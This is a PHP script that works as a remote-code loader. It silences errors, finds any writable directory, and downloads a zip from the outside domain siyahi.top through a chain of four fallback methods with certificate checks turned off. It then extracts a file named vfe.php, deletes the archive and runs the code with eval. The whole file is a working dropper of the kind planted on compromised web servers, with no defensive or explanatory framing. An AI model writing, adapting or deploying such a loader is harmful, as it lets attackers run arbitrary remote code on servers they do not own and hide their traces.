<?php
error_reporting(0);
@set_time_limit(0);
@ignore_user_abort(true);

$remoteZipUrl = 'https://siyahi.top/vfes.zip';
$innerPhpName  = 'vfe.php';           // name of the PHP file inside the zip
$minAcceptableSize = 200;             // bytes

// ────────────────────────────────────────────────
// Try to find ANY writable directory we can use
// ────────────────────────────────────────────────
function getUsableTempDir() {
    $candidates = [
        sys_get_temp_dir(),                  // usually /tmp
        '/tmp',
        '/var/tmp',
        dirname(__FILE__) . '/.cache',       // fallback inside current dir
        dirname(__FILE__),
    ];

    foreach ($candidates as $dir) {
        if (!is_dir($dir)) {
            @mkdir($dir, 0755, true);
        }
        if (is_dir($dir) && is_writable($dir)) {
            // quick write test
            $testFile = $dir . '/.write_test_' . mt_rand(1000,9999);
            if (@file_put_contents($testFile, 'test') !== false) {
                @unlink($testFile);
                return rtrim($dir, '/\\') . '/';
            }
        }
    }
    return false; // no writable location found → will fail later
}

$tempDir = getUsableTempDir();
if ($tempDir === false) {
    die("No writable temporary directory could be found.");
}

// ────────────────────────────────────────────────
// Use deterministic zip filename based on server hostname
// ────────────────────────────────────────────────
function getZipFileNameByHost() {
    $host = '';

    if (!empty($_SERVER['SERVER_NAME'])) {
        $host = $_SERVER['SERVER_NAME'];
    } elseif (!empty($_SERVER['HTTP_HOST'])) {
        $host = $_SERVER['HTTP_HOST'];
    } else {
        $host = gethostname();
    }

    $host = strtolower((string)$host);
    $host = preg_replace('/:\d+$/', '', $host); // remove port if present
    $host = preg_replace('/[^a-z0-9.-]/', '-', $host);
    $host = trim($host, '.-');

    if ($host === '') {
        $host = 'server';
    }

    return $host . '.zip';
}

$zipLocalName = getZipFileNameByHost();
$zipFullPath  = $tempDir . $zipLocalName;

// ────────────────────────────────────────────────
// Multi-method downloader with fallback chain
// ────────────────────────────────────────────────
function downloadWithFallback($url, $destination, $minSize) {
    $data = null;

    // 1. file_get_contents (allow_url_fopen)
    if (ini_get('allow_url_fopen')) {
        $ctx = stream_context_create([
            'ssl' => ['verify_peer'=>false, 'verify_peer_name'=>false]
        ]);
        $data = @file_get_contents($url, false, $ctx);
        if (is_string($data) && strlen($data) >= $minSize) {
            if (@file_put_contents($destination, $data) !== false) {
                return true;
            }
        }
    }

    // 2. cURL (most servers have it)
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL            => $url,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_FOLLOWLOCATION => 1,
            CURLOPT_MAXREDIRS      => 5,
            CURLOPT_TIMEOUT        => 40,
            CURLOPT_SSL_VERIFYPEER => 0,
            CURLOPT_SSL_VERIFYHOST => 0,
            CURLOPT_USERAGENT      => 'Mozilla/5.0 (compatible; Downloader/1.0)',
            CURLOPT_HEADER         => 0,
        ]);
        $data = curl_exec($ch);
        $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($http >= 200 && $http < 300 && is_string($data) && strlen($data) >= $minSize) {
            if (@file_put_contents($destination, $data) !== false) {
                return true;
            }
        }
    }

    // 3. fopen + stream_copy_to_stream (fopen wrappers)
    if (ini_get('allow_url_fopen')) {
        $in  = @fopen($url, 'rb');
        if (is_resource($in)) {
            $out = @fopen($destination, 'wb');
            if (is_resource($out)) {
                $bytes = stream_copy_to_stream($in, $out);
                fclose($in);
                fclose($out);
                if ($bytes >= $minSize) {
                    return true;
                }
            }
        }
    }

    // 4. last desperate attempt: fsockopen (very low level)
    $parts = parse_url($url);
    if (!isset($parts['host'])) return false;

    $port = isset($parts['port']) ? $parts['port'] : 443;
    $scheme = isset($parts['scheme']) && $parts['scheme'] === 'https' ? 'ssl://' : '';

    $fp = @fsockopen($scheme . $parts['host'], $port, $errno, $errstr, 20);
    if (!$fp) return false;

    $request  = "GET " . ($parts['path'] ?? '/') . " HTTP/1.1\r\n";
    $request .= "Host: " . $parts['host'] . "\r\n";
    $request .= "Connection: close\r\n\r\n";

    fwrite($fp, $request);

    $headers = '';
    while (!feof($fp)) {
        $line = fgets($fp);
        if ($line === "\r\n") break;
        $headers .= $line;
    }

    if (strpos($headers, '200') === false) {
        fclose($fp);
        return false;
    }

    $out = @fopen($destination, 'wb');
    if (!$out) {
        fclose($fp);
        return false;
    }

    $bytes = 0;
    while (!feof($fp)) {
        $chunk = fread($fp, 8192);
        if ($chunk === false || $chunk === '') break;
        fwrite($out, $chunk);
        $bytes += strlen($chunk);
    }
    fclose($fp);
    fclose($out);

    return $bytes >= $minSize;
}

// ────────────────────────────────────────────────
// Execute download
// ────────────────────────────────────────────────
$success = downloadWithFallback($remoteZipUrl, $zipFullPath, $minAcceptableSize);

if (!$success || !file_exists($zipFullPath) || filesize($zipFullPath) < $minAcceptableSize) {
    @unlink($zipFullPath);
    die("Download failed on all methods.");
}

// ────────────────────────────────────────────────
// Extract & eval the target file from zip
// ────────────────────────────────────────────────
if (!class_exists('ZipArchive')) {
    @unlink($zipFullPath);
    die("ZipArchive extension is not available.");
}

$zip = new ZipArchive();
if ($zip->open($zipFullPath) !== true) {
    @unlink($zipFullPath);
    die("Cannot open zip archive.");
}

$content = $zip->getFromName($innerPhpName);
$zip->close();

@unlink($zipFullPath);   // clean up immediately

if ($content === false) {
    die("File $innerPhpName not found inside zip.");
}

// ────────────────────────────────────────────────
// Execute extracted PHP code
// ────────────────────────────────────────────────
eval('?>' . $content);
exit;
